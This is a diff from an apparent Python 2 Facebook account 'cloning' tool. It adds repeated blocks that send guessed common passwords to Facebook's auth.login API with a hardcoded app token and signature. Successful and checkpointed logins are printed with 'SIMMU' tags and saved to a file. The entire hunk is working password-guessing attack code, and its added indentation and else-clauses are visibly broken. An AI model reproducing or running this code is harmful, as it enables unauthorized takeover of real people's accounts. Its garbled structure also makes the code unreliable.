@@ -343,7 +343,176 @@ def action():
                                                     cps.write(k+c+user+pass5+'\n')
                                                     cps.close()
                                                     cpb.append(c+user+pass5)
-                                                                                                                                                                                                                
+                                             else:
+                                            pass6="jannu14345"
+                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                            q = json.load(data)
+                                            if 'access_token' in q:
+                                                print '\x1b[1;32m[SIMMU-OK]  ' + k + c + user + '  |  ' + pass6
+                                                okb = open('save/cloned.txt', 'a')
+                                                okb.write(k+c+user+pass6+'\n')
+                                                okb.close()
+                                                oks.append(c+user+pass6)
+                                            else:
+                                                if 'www.facebook.com' in q['error_msg']:
+                                                    print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass6 
+                                                    cps = open('save/cloned.txt', 'a')
+                                                    cps.write(k+c+user+pass6+'\n')
+                                                    cps.close()
+                                                    cpb.append(c+user+pass6)
+                                                    else:
+                                            pass7="12345a"
+                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                            q = json.load(data)
+                                            if 'access_token' in q:
+                                                print '\x1b[1;32m[SIMMU-OK]  ' + k + c + user + '  |  ' + pass7
+                                                okb = open('save/cloned.txt', 'a')
+                                                okb.write(k+c+user+pass7+'\n')
+                                                okb.close()
+                                                oks.append(c+user+pass7)
+                                            else:
+                                                if 'www.facebook.com' in q['error_msg']:
+                                                    print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass7 
+                                                    cps = open('save/cloned.txt', 'a')
+                                                    cps.write(k+c+user+pass7+'\n')
+                                                    cps.close()
+                                                    cpb.append(c+user+pass7)
+                                                    else:
+                                            pass8="12341234"
+                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                            q = json.load(data)
+                                            if 'access_token' in q:
+                                                print '\x1b[1;32m[SIMMU-OK]  ' + k + c + user + '  |  ' + pass8
+                                                okb = open('save/cloned.txt', 'a')
+                                                okb.write(k+c+user+pass8+'\n')
+                                                okb.close()
+                                                oks.append(c+user+pass8)
+                                            else:
+                                                if 'www.facebook.com' in q['error_msg']:
+                                                    print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass8 
+                                                    cps = open('save/cloned.txt', 'a')
+                                                    cps.write(k+c+user+pass8+'\n')
+                                                    cps.close()
+                                                    cpb.append(c+user+pass8)
+                                                    else:
+                                            pass9="abcd123"
+                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                            q = json.load(data)
+                                            if 'access_token' in q:
+                                                print '\x1b[1;32m[SIMMU-OK]  ' + k + c + user + '  |  ' + pass9
+                                                okb = open('save/cloned.txt', 'a')
+                                                okb.write(k+c+user+pass9+'\n')
+                                                okb.close()
+                                                oks.append(c+user+pass9)
+                                            else:
+                                                if 'www.facebook.com' in q['error_msg']:
+                                                    print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass9 
+                                                    cps = open('save/cloned.txt', 'a')
+                                                    cps.write(k+c+user+pass9+'\n')
+                                                    cps.close()
+                                                    cpb.append(c+user+pass9)
+                                                    else:
+                                            pass10="2000"
+                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                            q = json.load(data)
+                                            if 'access_token' in q:
+                                                print '\x1b[1;32m[SIMMU-OK]  ' + k + c + user + '  |  ' + pass10
+                                                okb = open('save/cloned.txt', 'a')
+                                                okb.write(k+c+user+pass10+'\n')
+                                                okb.close()
+                                                oks.append(c+user+pass10)
+                                            else:
+                                                if 'www.facebook.com' in q['error_msg']:
+                                                    print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass10 
+                                                    cps = open('save/cloned.txt', 'a')
+                                                    cps.write(k+c+user+pass10+'\n')
+                                                    cps.close()
+                                                    cpb.append(c+user+pass10)
+                                                    else:
+                                            pass11="20102010"
+                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                            q = json.load(data)
+                                            if 'access_token' in q:
+                                                print '\x1b[1;32m[SIMMU-OK]  ' + k + c + user + '  |  ' + pass11
+                                                okb = open('save/cloned.txt', 'a')
+                                                okb.write(k+c+user+pass11+'\n')
+                                                okb.close()
+                                                oks.append(c+user+pass11)
+                                            else:
+                                                if 'www.facebook.com' in q['error_msg']:
+                                                    print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass11 
+                                                    cps = open('save/cloned.txt', 'a')
+                                                    cps.write(k+c+user+pass11+'\n')
+                                                    cps.close()
+                                                    cpb.append(c+user+pass11)
+                                                    else:
+                                            pass12="jan2000"
+                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                            q = json.load(data)
+                                            if 'access_token' in q:
+                                                print '\x1b[1;32m[SIMMU-OK]  ' + k + c + user + '  |  ' + pass12
+                                                okb = open('save/cloned.txt', 'a')
+                                                okb.write(k+c+user+pass12+'\n')
+                                                okb.close()
+                                                oks.append(c+user+pass12)
+                                            else:
+                                                if 'www.facebook.com' in q['error_msg']:
+                                                    print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass12 
+                                                    cps = open('save/cloned.txt', 'a')
+                                                    cps.write(k+c+user+pass12+'\n')
+                                                    cps.close()
+                                                    cpb.append(c+user+pass12)
+                                                    else:
+                                            pass13="1jan2001"
+                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                            q = json.load(data)
+                                            if 'access_token' in q:
+                                                print '\x1b[1;32m[SIMMU-OK]  ' + k + c + user + '  |  ' + pass13
+                                                okb = open('save/cloned.txt', 'a')
+                                                okb.write(k+c+user+pass13+'\n')
+                                                okb.close()
+                                                oks.append(c+user+pass13)
+                                            else:
+                                                if 'www.facebook.com' in q['error_msg']:
+                                                    print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass13 
+                                                    cps = open('save/cloned.txt', 'a')
+                                                    cps.write(k+c+user+pass13+'\n')
+                                                    cps.close()
+                                                    cpb.append(c+user+pass13)
+                                                    else:
+                                            pass14="01jan2002"
+                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                            q = json.load(data)
+                                            if 'access_token' in q:
+                                                print '\x1b[1;32m[SIMMU-OK]  ' + k + c + user + '  |  ' + pass14
+                                                okb = open('save/cloned.txt', 'a')
+                                                okb.write(k+c+user+pass14+'\n')
+                                                okb.close()
+                                                oks.append(c+user+pass14)
+                                            else:
+                                                if 'www.facebook.com' in q['error_msg']:
+                                                    print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass14 
+                                                    cps = open('save/cloned.txt', 'a')
+                                                    cps.write(k+c+user+pass14+'\n')
+                                                    cps.close()
+                                                    cpb.append(c+user+pass14)
+                                                    else:
+                                            pass15="January1999"
+                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass15 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                            q = json.load(data)
+                                            if 'access_token' in q:
+                                                print '\x1b[1;32m[SIMMU-OK]  ' + k + c + user + '  |  ' + pass15
+                                                okb = open('save/cloned.txt', 'a')
+                                                okb.write(k+c+user+pass15+'\n')
+                                                okb.close()
+                                                oks.append(c+user+pass15)
+                                            else:
+                                                if 'www.facebook.com' in q['error_msg']:
+                                                    print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass15 
+                                                    cps = open('save/cloned.txt', 'a')
+                                                    cps.write(k+c+user+pass15+'\n')
+                                                    cps.close()
+                                                    cpb.append(c+user+pass15)                                                                                                                                                                   
                                                                                                                                                                                                                 
                                                                                                                                                                                                             
                                                                                                                                                                                                             
